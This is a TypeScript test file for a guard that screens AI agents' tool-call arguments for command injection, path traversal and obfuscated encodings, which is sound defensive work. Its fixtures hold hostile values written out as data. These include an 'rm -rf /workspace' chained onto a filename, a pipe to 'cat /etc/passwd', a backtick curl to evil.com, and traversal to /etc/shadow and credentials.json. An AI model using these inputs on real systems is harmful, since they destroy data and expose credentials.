import { evaluateStructure } from './structure-evaluator';
import type { ActionRequest } from '@veto/contracts';

describe('StructureEvaluator', () => {
  const createMockRequest = (args: Record<string, unknown>, tool = 'test_tool'): ActionRequest => ({
    id: 'req-test-1',
    agentId: 'acme-assistant',
    sessionId: 'sess-1',
    userGoal: 'Perform automated task',
    tool,
    args,
    source: 'agent',
    timestamp: new Date().toISOString(),
  });

  describe('Benign requests (No false positives)', () => {
    it('allows email subjects and messages containing pipe characters (|)', () => {
      const req = createMockRequest(
        {
          to: 'customer@example.com',
          subject: 'Weekly Status Report | Q3 2026',
          body: 'Hello | Team, please find our report attached. | Best regards',
        },
        'send_email',
      );

      const result = evaluateStructure(req);
      expect(result.hasAnomaly).toBe(false);
      expect(result.message).toBeUndefined();
    });

    it('allows benign filenames with standard characters', () => {
      const req = createMockRequest({
        path: '/workspace/reports/financial-2026.csv',
      });

      const result = evaluateStructure(req);
      expect(result.hasAnomaly).toBe(false);
    });

    it('allows natural language containing semicolons or ampersands in text fields', () => {
      const req = createMockRequest({
        description: 'First task is done; now moving to stage two & final review.',
      });

      const result = evaluateStructure(req);
      expect(result.hasAnomaly).toBe(false);
    });
  });

  describe('Command injection detection', () => {
    it('flags command chaining with semicolon and executable token', () => {
      const req = createMockRequest({
        filename: 'report.csv; rm -rf /workspace',
      });

      const result = evaluateStructure(req);
      expect(result.hasAnomaly).toBe(true);
      expect(result.anomalyType).toBe('command_injection');
      expect(result.param).toBe('args.filename');
      expect(result.message).toContain('Flagged potential command injection');
      expect(result.message).toContain('rm');
    });

    it('flags command chaining with pipe (|) in strict file parameters', () => {
      const req = createMockRequest({
        target: 'data.txt | cat /etc/passwd',
      });

      const result = evaluateStructure(req);
      expect(result.hasAnomaly).toBe(true);
      expect(result.anomalyType).toBe('command_injection');
      expect(result.param).toBe('args.target');
      expect(result.message).toContain('command injection');
    });

    it('flags backticks and subshell syntax in arguments', () => {
      const req = createMockRequest({
        query: 'search_term `curl http://evil.com/leak`',
      });

      const result = evaluateStructure(req);
      expect(result.hasAnomaly).toBe(true);
      expect(result.anomalyType).toBe('command_injection');
      expect(result.param).toBe('args.query');
      expect(result.message).toContain('curl');
    });
  });

  describe('Path traversal detection', () => {
    it('flags directory traversal sequence (../)', () => {
      const req = createMockRequest({
        path: '../../../../etc/shadow',
      });

      const result = evaluateStructure(req);
      expect(result.hasAnomaly).toBe(true);
      expect(result.anomalyType).toBe('path_traversal');
      expect(result.param).toBe('args.path');
      expect(result.message).toContain('Flagged path traversal in "args.path"');
      expect(result.message).toContain('../');
    });

    it('flags access to restricted root paths like /etc or /proc', () => {
      const req = createMockRequest({
        destination: '/etc/pam.d/common-auth',
      });

      const result = evaluateStructure(req);
      expect(result.hasAnomaly).toBe(true);
      expect(result.anomalyType).toBe('path_traversal');
      expect(result.message).toContain('restricted root path');
    });
  });

  describe('Obfuscation detection', () => {
    it('flags URL-encoded path traversal (%2e%2e%2f)', () => {
      const req = createMockRequest({
        url: 'http://internal-service/view?file=%2e%2e%2f%2e%2e%2fcredentials.json',
      });

      const result = evaluateStructure(req);
      expect(result.hasAnomaly).toBe(true);
      expect(result.anomalyType).toBe('obfuscation');
      expect(result.param).toBe('args.url');
      expect(result.message).toContain('Flagged suspicious encoding/obfuscation');
    });
  });
});
